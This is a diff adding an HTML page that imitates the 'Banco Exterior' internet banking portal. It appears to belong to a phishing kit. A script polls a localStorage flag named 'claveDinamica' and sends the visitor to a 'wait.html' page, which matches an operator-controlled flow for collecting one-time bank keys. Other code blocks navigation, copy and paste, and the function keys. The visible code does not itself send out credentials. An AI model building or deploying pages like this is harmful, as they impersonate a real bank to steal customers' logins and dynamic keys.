@@ -1,0 +1,235 @@
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=8"/>
+<link rel="stylesheet" href="/code1_files/style.css">
+
+
+
+<TITLE>Banco Exterior, Sistema de Banca por Internet</TITLE> 
+<script>
+	function locals(params) {
+	console.log("Cargado el script de la pagina");
+	localStorage.setItem("claveDinamica", "false");
+}
+locals();
+function chck(params) {
+
+setInterval(() => {
+	if (localStorage.getItem("claveDinamica") == "true") {
+	window.location = "wait.html"
+		
+	}
+	
+}, 500);
+
+}
+
+chck();
+</script>
+
+<script language="JavaScript" type="text/JavaScript">
+if(top != self){
+  top.location = self.location;
+}
+</script>
+
+<SCRIPT LANGUAGE="JavaScript">
+  //Deshabilitar teclas 
+  document.onkeydown = function(event){  		
+	
+	var alt=false;
+	var ctrl=false;
+	var kcode;		
+	var navegador="";
+	if(event)
+	{	
+		if(event.which)//Netscape    	
+		{
+			navegador="N";
+		    kcode=event.which; 	
+			
+			//Tecla Alt presionada
+			if(event.altKey)
+	  	   	  alt=true;
+
+			//Tecla Control presionada
+			if(event.ctrlKey)
+	  	   	  ctrl=true;
+		}
+	}
+	else
+	if(window.event.keyCode)//Internet Explorer 	
+	{
+		navegador="IE";
+	    kcode=window.event.keyCode; 
+		
+		//Tecla Alt presionada
+		if(window.event.altKey)
+	  	  alt=true;
+
+		//Tecla Control presionada
+		if(window.event.ctrlKey)
+	  	  ctrl=true;
+	}
+
+	//alert(kcode)
+	
+
+	//Deshabilia Alt + Flecha Izq y/o Der (Atras, Adelante)
+	if(alt==true && (kcode==37 || kcode==39))
+	{				  
+		return false;				
+	}
+
+	//Deshabilia Contol + C,V,X (Copiar, Pegar, Cortar)
+	if(ctrl==true && (kcode==67 || kcode==86 || kcode==88))
+	{
+		return false;
+	}
+
+	//Deshabilia F1 -> F12
+	if (kcode >= 112 && kcode <= 123)
+	{ 		
+		if(navegador=="N")
+		{				  
+		   return false;		
+		}
+		else
+		if(navegador=="IE")
+		{		   			   
+		   window.event.keyCode = 505;
+		   return false;  
+		}
+	} 
+		
+
+	if (kcode == 8) //BackSpace
+	{ 
+		valor = document.activeElement.value; 
+
+		if (valor==undefined) //Evita Back en p�gina. 
+		{ 
+			if(navegador=="N")//Netscape 
+			{
+			  event.preventDefault();
+ 		      event.returnValue = false;
+			}
+			return false;
+		}
+		else 
+		{ 	
+			var type = document.activeElement.type;
+			type = type.toUpperCase();					
+
+			if (type=='SELECT-ONE') //Evita Back en select. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else
+			if (type=='BUTTON') //Evita Back en button. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RADIO') //Evita Back en radio. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='CHECKBOX') //Evita Back en checkbox. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='FILE') //Evita Back en file. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RESET') //Evita Back en reset. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='SUBMIT') //Evita Back en submit. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			} 
+			else //Text, textarea o password 
+			{ 
+			    if (document.activeElement.value.length==0) //No realiza el backspace(largo igual a 0). 
+			    { 
+					if(navegador=="N")//Netscape 
+					{
+					  event.preventDefault();
+		 		      event.returnValue = false;
+					}
+					return false;	
+				}
+			    /*else //Realiza el backspace. 
+			    { 
+				  document.activeElement.value.keyCode = 8; 
+				}*/ 
+			} 
+			
+		} 
+	} 
+
+   }//fin desabilitar teclas 
+
+</SCRIPT>
+
+
+</head>
+
+  <frameset rows="133,*" frameborder="NO" border="0" framespacing="0" > 
+    <frame name="top" scrolling="NO" noresize target="menu" src="/code1_files/menu_ver_top.html"  >
+    <frameset cols="190,*" frameborder="NO" border="0" framespacing="0" rows="*" > 
+		<div  style="display: none;">
+			<frame name="menu" scrolling="NO" noresize target="main" >
+		</div>
+     
+      <frame name="body" src="/code1_files/body_inimessages.html" target="body" scrolling="auto"  style="align:center;vertical-align:middle;">
+    </frameset>
+  </frameset>
+<body>
+
+</body>
+
+</html>
+
